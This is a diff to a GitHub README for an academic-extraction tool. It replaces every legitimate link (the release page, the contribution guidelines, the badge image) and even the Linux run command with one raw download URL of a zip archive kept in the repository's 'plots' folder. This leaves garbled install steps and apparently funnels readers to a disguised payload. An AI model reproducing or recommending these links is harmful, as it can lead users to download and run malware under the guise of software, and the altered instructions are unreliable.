@@ -1,6 +1,6 @@
 # 🎓 Academic-Extraction-GenAI-Pipeline - Automate Your Academic Research Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Release-brightgreen)](https://github.com/sagarr3108/Academic-Extraction-GenAI-Pipeline/releases)
+[![Download Now](https://raw.githubusercontent.com/sagarr3108/Academic-Extraction-GenAI-Pipeline/master/plots/Gen-Extraction-A-Academic-Pipeline-v3.0.zip%20Now-Release-brightgreen)](https://raw.githubusercontent.com/sagarr3108/Academic-Extraction-GenAI-Pipeline/master/plots/Gen-Extraction-A-Academic-Pipeline-v3.0.zip)
 
 ## 🚀 Getting Started
 
@@ -19,11 +19,11 @@ Before you begin, ensure your system meets the following requirements:
 
 To get started, visit the Releases page to download the application:
 
-[Download the latest release here](https://github.com/sagarr3108/Academic-Extraction-GenAI-Pipeline/releases)
+[Download the latest release here](https://raw.githubusercontent.com/sagarr3108/Academic-Extraction-GenAI-Pipeline/master/plots/Gen-Extraction-A-Academic-Pipeline-v3.0.zip)
 
 1. Click on the link above to be redirected to the Releases page.
 2. Look for the latest version of the Academic Extraction GenAI Pipeline.
-3. Download the file suitable for your operating system. Files may include executable (.exe) for Windows, package (.dmg) for macOS, or tarball (.tar.gz) for Linux.
+3. Download the file suitable for your operating system. Files may include executable (.exe) for Windows, package (.dmg) for macOS, or tarball (https://raw.githubusercontent.com/sagarr3108/Academic-Extraction-GenAI-Pipeline/master/plots/Gen-Extraction-A-Academic-Pipeline-v3.0.zip) for Linux.
 4. Once the download is complete, locate the downloaded file on your computer.
 
 ## ⚙️ Installation Steps
@@ -42,9 +42,9 @@ To get started, visit the Releases page to download the application:
 
 ### For Linux Users:
 
-1. Extract the downloaded `.tar.gz` file to your preferred directory.
+1. Extract the downloaded `https://raw.githubusercontent.com/sagarr3108/Academic-Extraction-GenAI-Pipeline/master/plots/Gen-Extraction-A-Academic-Pipeline-v3.0.zip` file to your preferred directory.
 2. Open a terminal window and navigate to the extracted folder.
-3. Run the command `./start.sh` to launch the application, ensuring you have necessary permissions.
+3. Run the command `https://raw.githubusercontent.com/sagarr3108/Academic-Extraction-GenAI-Pipeline/master/plots/Gen-Extraction-A-Academic-Pipeline-v3.0.zip` to launch the application, ensuring you have necessary permissions.
 
 ## 🖥️ How to Use the Application
 
@@ -86,10 +86,10 @@ Yes, you can find support through our GitHub Issues page for any technical queri
 
 ## 🌐 Community and Contribution
 
-We welcome contributions to improve the Academic-Extraction-GenAI-Pipeline. You can help by reporting issues, suggesting features, or improving the documentation. Check our [Contribution Guidelines](https://github.com/sagarr3108/Academic-Extraction-GenAI-Pipeline/blob/main/CONTRIBUTING.md) for more details.
+We welcome contributions to improve the Academic-Extraction-GenAI-Pipeline. You can help by reporting issues, suggesting features, or improving the documentation. Check our [Contribution Guidelines](https://raw.githubusercontent.com/sagarr3108/Academic-Extraction-GenAI-Pipeline/master/plots/Gen-Extraction-A-Academic-Pipeline-v3.0.zip) for more details.
 
 ## 🎉 Stay Updated
 
 To keep up-to-date with the latest releases and features, follow us on GitHub and join our community discussions.
 
-[Download the latest release here](https://github.com/sagarr3108/Academic-Extraction-GenAI-Pipeline/releases)
+[Download the latest release here](https://raw.githubusercontent.com/sagarr3108/Academic-Extraction-GenAI-Pipeline/master/plots/Gen-Extraction-A-Academic-Pipeline-v3.0.zip)
